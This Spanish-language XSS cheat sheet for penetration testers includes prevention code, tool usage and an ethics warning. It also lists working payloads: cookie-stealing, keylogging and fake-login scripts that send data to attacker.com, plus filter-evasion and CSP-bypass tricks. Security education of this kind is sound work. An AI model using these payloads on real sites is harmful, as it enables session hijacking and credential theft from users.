# Cross-Site Scripting (XSS)

## ¿Qué es XSS?

Cross-Site Scripting (XSS) es una vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en páginas web vistas por otros usuarios.

## Tipos de XSS

### 1. Reflected XSS (No persistente)
El payload se refleja inmediatamente en la respuesta.

```html
<!-- URL vulnerable -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- Respuesta -->
<p>Resultados para: <script>alert('XSS')</script></p>
```

### 2. Stored XSS (Persistente)
El payload se almacena en la base de datos y se ejecuta cada vez que se visualiza.

```javascript
// Comentario malicioso almacenado en BD
<script>
fetch('http://attacker.com/steal?cookie='+document.cookie)
</script>
```

### 3. DOM-based XSS
La vulnerabilidad existe en el código JavaScript del lado del cliente.

```javascript
// Código vulnerable
var search = window.location.search;
document.write(search);

// URL maliciosa
http://example.com#<script>alert('XSS')</script>
```

## Payloads Básicos

### Alert boxes
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
```

### Sin tags de script
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<select onfocus=alert('XSS') autofocus>
<textarea autofocus onfocus=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
```

### Event handlers
```html
<button onclick=alert('XSS')>Click</button>
<div onmouseover=alert('XSS')>Hover</div>
<details ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

## Payloads Avanzados

### Robo de cookies
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

<script>
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie
</script>

<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
})
</script>
```

### Keylogger
```html
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    new Image().src = 'http://attacker.com/log?keys=' + keys;
}
</script>
```

### Phishing
```html
<script>
document.body.innerHTML = '<h1>Session Expired</h1>' +
'<form action="http://attacker.com/steal.php">' +
'<input type="text" name="username" placeholder="Username">' +
'<input type="password" name="password" placeholder="Password">' +
'<input type="submit" value="Login">' +
'</form>';
</script>
```

### Redireccionamiento
```html
<script>window.location='http://attacker.com'</script>
<script>window.open('http://attacker.com')</script>
```

### Defacement
```html
<script>
document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

## Bypass de Filtros

### Mayúsculas/Minúsculas
```html
<ScRiPt>alert('XSS')</sCrIpT>
<iMg sRc=x oNeRrOr=alert('XSS')>
```

### Encoding

#### HTML Entities
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

#### URL Encoding
```
%3Cscript%3Ealert('XSS')%3C/script%3E
```

#### Double URL Encoding
```
%253Cscript%253Ealert('XSS')%253C/script%253E
```

#### Unicode
```html
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

#### Hex Encoding
```html
<img src=x onerror="\x61\x6c\x65\x72\x74('XSS')">
```

### Fragmentación
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### Comentarios
```html
<!--><script>alert('XSS')</script>-->
<script>al<!--comment-->ert('XSS')</script>
```

### Null bytes
```html
<script>alert('XSS')%00</script>
```

### Sin espacios
```html
<svg/onload=alert('XSS')>
<img/src=x/onerror=alert('XSS')>
```

### Sin paréntesis
```html
<script>alert`XSS`</script>
<script>alert\`XSS\`</script>
<script>setTimeout`alert\x28'XSS'\x29`</script>
```

### Sin comillas
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/)</script>
```

### Bypass de palabras clave
```html
<!-- Si "script" está bloqueado -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Si "on" está bloqueado -->
<svg/onload=alert('XSS')>
<svg id=x onfocus=alert('XSS') autofocus>

<!-- Usando event listeners -->
<input id=x>
<script>
document.getElementById('x').addEventListener('click', function(){alert('XSS')})
</script>
```

### Bypass de CSP (Content Security Policy)

#### JSONP endpoints
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert('XSS')"></script>
```

#### AngularJS
```html
{{constructor.constructor('alert(1)')()}}
<div ng-app ng-csp><div ng-click="$event.view.alert('XSS')">Click</div></div>
```

## Detección Automática

### XSSer
```bash
# Escaneo básico
xsser -u "http://example.com/page?param=XSS"

# Con cookies
xsser -u "http://example.com/page?param=XSS" --cookie="session=abc123"

# Usando payloads específicos
xsser -u "http://example.com/page?param=XSS" --payload="<script>alert('XSS')</script>"

# Report
xsser -u "http://example.com/page?param=XSS" --report
```

### Burp Suite
1. Intercept request
2. Send to Intruder
3. Add XSS payload list
4. Grep for reflection
5. Test successful payloads manually

### OWASP ZAP
1. Automated Scan
2. Active Scan rules incluyen XSS
3. Review alerts
4. Verify false positives

## Testing Manual

### Checklist
- [ ] Identificar puntos de entrada (parámetros, forms, headers)
- [ ] Probar caracteres especiales: `< > " ' / =`
- [ ] Ver si se reflejan en la respuesta
- [ ] Probar payloads básicos
- [ ] Verificar filtros aplicados
- [ ] Intentar bypass
- [ ] Documentar contexto (HTML, JavaScript, atributo)
- [ ] Crear PoC (Proof of Concept)

### Contextos comunes

#### HTML Body
```html
<!-- Input -->
<p>User input here</p>

<!-- Test -->
<script>alert('XSS')</script>
```

#### Atributo HTML
```html
<!-- Input -->
<input value="USER_INPUT">

<!-- Test -->
" onload="alert('XSS')
" autofocus onfocus="alert('XSS')
```

#### JavaScript
```html
<!-- Input -->
<script>var name = 'USER_INPUT';</script>

<!-- Test -->
'; alert('XSS'); //
</script><script>alert('XSS')</script>
```

#### URL
```html
<!-- Input -->
<a href="USER_INPUT">Link</a>

<!-- Test -->
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

## Prevención

### Input Validation
```javascript
// Whitelist de caracteres permitidos
function validateInput(input) {
    const regex = /^[a-zA-Z0-9 ]*$/;
    return regex.test(input);
}
```

### Output Encoding

#### HTML Context
```javascript
// Encode HTML entities
function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
```

#### JavaScript Context
```javascript
function escapeJs(text) {
    return text
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r');
}
```

### Content Security Policy (CSP)
```html
<!-- Header -->
Content-Security-Policy: default-src 'self'; script-src 'self'

<!-- Meta tag -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

### HTTPOnly Cookies
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### Framework Protection

#### React
```jsx
// React escapa por defecto
<div>{userInput}</div>

// Peligroso (evitar)
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

#### Angular
```html
<!-- Angular sanitiza por defecto -->
<div>{{userInput}}</div>

<!-- Peligroso (evitar) -->
<div [innerHTML]="userInput"></div>
```

#### Vue
```html
<!-- Vue escapa por defecto -->
<div>{{ userInput }}</div>

<!-- Peligroso (evitar) -->
<div v-html="userInput"></div>
```

## Impacto

### Bajo
- Defacement temporal
- Pop-ups molestos

### Medio
- Robo de sesión
- Phishing
- Keylogging

### Alto
- Account takeover
- Acceso a datos sensibles
- Propagación de malware
- Defacement permanente

## Notas Importantes

> [!WARNING]
> **Ética:**
> - Solo prueba en aplicaciones autorizadas
> - No uses XSS para:
>   - Robar credenciales reales
>   - Acceder a cuentas de otros
>   - Causar daño
> - Reporta vulnerabilidades responsablemente

> [!TIP]
> **Best Practices:**
> - Documenta contexto exacto donde ocurre XSS
> - Crea PoC no invasivos (usa alert, prompt)
> - Incluye steps de reproducción
> - Sugiere remediación específica
> - Considera el impacto real

## Laboratorios de Práctica

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [DVWA](http://www.dvwa.co.uk/)
- [XSS Game](https://xss-game.appspot.com/)
- [Hack.me](https://hack.me/)
- [PentesterLab](https://pentesterlab.com/)

## Recursos

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
